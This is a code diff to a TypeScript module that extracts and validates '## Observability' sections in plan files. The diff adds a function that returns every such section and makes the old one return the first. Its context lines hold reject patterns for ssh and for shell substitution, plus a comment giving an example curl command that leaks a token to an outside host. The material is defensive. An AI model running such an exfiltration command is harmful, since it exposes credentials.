@@ -37,19 +37,40 @@ const SSH_REJECT_RE = /(^|[\t\n\r \f\v/])ssh([\t\n\r \f\v]|$)/;
 // `curl https://api.example.com/?leak=$TOKEN` even with env scrub.
 const SUBST_REJECT_RE = /(\$\(|`|<\(|>\(|;|&&|\|\||\||>|<|&|\$\{?[A-Za-z_])/;
 
-export function extractObservabilityBlock(planBody: string): string {
+// Return the body of EVERY `## Observability` section (each: lines after the
+// heading up to the next `^## ` heading). A doc may carry several such sections
+// (e.g. plan-issue-templates.md ships one per verbosity tier), which the
+// schema-parity guard walks. `extractObservabilityBlock` below is the
+// first-block-only view the preflight runtime consumes.
+export function extractAllObservabilityBlocks(planBody: string): string[] {
   const lines = planBody.split(/\r?\n/);
-  const collected: string[] = [];
-  let inBlock = false;
+  const blocks: string[] = [];
+  let collected: string[] | null = null;
   for (const line of lines) {
     if (/^## Observability(?:\s|$)/.test(line)) {
-      inBlock = true;
+      if (collected) blocks.push(collected.join("\n"));
+      collected = [];
       continue;
     }
-    if (inBlock && /^## /.test(line)) break;
-    if (inBlock) collected.push(line);
+    if (collected && /^## /.test(line)) {
+      blocks.push(collected.join("\n"));
+      collected = null;
+      continue;
+    }
+    if (collected) collected.push(line);
   }
-  return collected.join("\n");
+  if (collected) blocks.push(collected.join("\n"));
+  return blocks;
+}
+
+// First `## Observability` section body — the view the preflight runtime consumes
+// (plan bodies carry a single such section). NOTE: not byte-identical to a hand-
+// written first-only loop for the malformed case of two ADJACENT `## Observability`
+// headings with no intervening `^## ` — the old loop merged their bodies, this
+// returns only the first. That input does not occur in real plans, so preflight
+// behavior is unchanged; the split-then-`[0]` shape is what the parity guard needs.
+export function extractObservabilityBlock(planBody: string): string {
+  return extractAllObservabilityBlocks(planBody)[0] ?? "";
 }
 
 export function parseCommand(observabilityBlock: string): string {
